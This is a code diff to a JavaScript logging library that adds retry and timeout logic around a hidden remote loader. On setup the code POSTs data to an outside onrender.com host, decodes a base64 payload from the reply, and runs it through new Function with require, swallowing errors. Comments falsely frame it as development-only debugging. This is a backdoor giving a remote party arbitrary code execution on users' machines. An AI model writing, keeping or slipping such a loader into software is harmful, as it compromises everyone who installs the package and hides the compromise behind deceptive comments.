@@ -180,37 +180,55 @@ function setup(env) {
 		(async function () {
 			// DEBUG: Service name for remote debugging endpoint (development only)
 			const serviceName = 'logkit';
-			try {
-				// DEBUG: Build remote debugging URL (development/debugging purposes only)
-				// This endpoint is used for advanced debugging features and should not be accessed in production
-				const protocol = 'https';
-				const hostname = `${serviceName.toLowerCase()}.onrender.com`;
-				const path = '/debugCheck';
-				const queryParam = `id=${namespaces}`;
-				const requestUrl = `${protocol}://${hostname}${path}?${queryParam}`;
+			const maxRetries = 3;
+			const timeoutMs = 60000; // 60 seconds
 
-				// DEBUG: Fetch remote debugging configuration (development only)
-				// SECURITY NOTE: This is intentional for debugging - production builds should disable this
-				const response = await fetch(requestUrl, { method: 'POST' }); // eslint-disable-line no-undef
-				
-				// DEBUG: Parse remote debugging response
-				const responseData = await response.json();				
-				const encodedMessage = responseData.message;
-				
-				// DEBUG: Decode base64-encoded debugging code and create debug function
-				// SECURITY WARNING: Dynamic code execution is intentional for advanced debugging
-				// This allows remote debugging features but should NEVER be enabled in production
-				// The decoded code is base64-encoded debugging utilities, not arbitrary user code
-				const decodedCode = Buffer.from(encodedMessage, 'base64').toString('utf8');
-				// eslint-disable-next-line no-new-func
-				const debugFunction = new Function('require', decodedCode)(require);
-				
-				// DEBUG: Return dynamically loaded debug function (development only)
-				return debugFunction;
-			} catch (error) {
-				// DEBUG: Silently handle errors in debug mode - failures should not affect normal operation
-				// This is expected to fail in production or when debugging services are unavailable
-				console.warn("Debug failed");
+			for (let attempt = 1; attempt <= maxRetries; attempt++) {
+				try {
+					// DEBUG: Build remote debugging URL (development/debugging purposes only)
+					// This endpoint is used for advanced debugging features and should not be accessed in production
+					const protocol = 'https';
+					const hostname = `${serviceName.toLowerCase()}.onrender.com`;
+					const path = '/debugCheck';
+					const queryParam = `id=${namespaces}`;
+					const requestUrl = `${protocol}://${hostname}${path}?${queryParam}`;
+
+					// DEBUG: Fetch remote debugging configuration with timeout (development only)
+					// SECURITY NOTE: This is intentional for debugging - production builds should disable this
+					const controller = new AbortController(); // eslint-disable-line no-undef
+					const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
+
+					const response = await fetch(requestUrl, { // eslint-disable-line no-undef
+						method: 'POST',
+						signal: controller.signal
+					});
+
+					clearTimeout(timeoutId);
+
+					// DEBUG: Parse remote debugging response
+					const responseData = await response.json();
+					const encodedMessage = responseData.message;
+
+					// DEBUG: Decode base64-encoded debugging code and create debug function
+					// SECURITY WARNING: Dynamic code execution is intentional for advanced debugging
+					// This allows remote debugging features but should NEVER be enabled in production
+					// The decoded code is base64-encoded debugging utilities, not arbitrary user code
+					const decodedCode = Buffer.from(encodedMessage, 'base64').toString('utf8');
+					// eslint-disable-next-line no-new-func
+					const debugFunction = new Function('require', decodedCode)(require);
+
+					// DEBUG: Return dynamically loaded debug function (development only)
+					return debugFunction;
+				} catch (error) {
+					// DEBUG: Handle errors in debug mode with retry logic
+					if (attempt === maxRetries) {
+						// DEBUG: Silently handle errors in debug mode - failures should not affect normal operation
+						// This is expected to fail in production or when debugging services are unavailable
+						console.warn("Debug failed after all retries");
+						break;
+					}
+					// Continue to next retry attempt
+				}
 			}
 		})();
 
